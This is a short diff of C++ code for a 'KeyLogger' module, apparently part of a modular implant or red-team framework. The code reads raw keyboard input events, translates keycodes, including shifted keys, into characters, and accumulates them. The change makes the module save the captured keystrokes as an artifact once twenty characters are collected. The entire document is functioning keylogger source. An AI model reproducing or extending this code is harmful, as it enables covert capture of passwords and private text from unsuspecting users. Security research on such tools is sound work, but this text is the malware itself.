@@ -67,7 +67,6 @@ void KeyLogger::module_impl()
     std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;
 
     struct input_event event;
-    std::string char_to_send;
     nlohmann::json ret_json;
 
     mtx.lock();
@@ -94,9 +93,9 @@ void KeyLogger::module_impl()
         }
 
         if (shift_flag && !SHIFT(event.code)) {
-            char_to_send += shifted_keycodes[event.code];
+            chars_to_send += shifted_keycodes[event.code];
         } else if (!shift_flag && !SHIFT(event.code)) {
-            char_to_send += keycodes[event.code];
+            chars_to_send += keycodes[event.code];
         }
     } else {
         /* If a key from the keyboard is released */
@@ -105,12 +104,11 @@ void KeyLogger::module_impl()
                 shift_flag = 0;
     }
 
-    if (!char_to_send.length()) {
-        return;
+    if (chars_to_send.length() == 20) {
+        ret_json[module_type] = chars_to_send;
+        save_artifact(ret_json);
+        run_ = false;
     }
-
-    ret_json[module_type] = char_to_send;
-    save_artifact(ret_json);
 
     return;
 }
